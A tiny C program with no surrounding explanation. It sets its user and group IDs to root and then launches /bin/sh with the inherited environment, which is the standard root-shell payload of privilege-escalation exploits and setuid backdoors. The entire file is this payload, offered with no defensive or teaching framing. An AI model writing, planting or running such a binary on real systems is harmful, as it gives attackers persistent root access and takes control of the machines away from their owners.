#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  char * args[2] = {0};
  args[0] = "/bin/sh";
  args[1] = NULL;
  setuid(0);
  setgid(0);
  execvpe("/bin/sh", args, envp);
  return 0;
}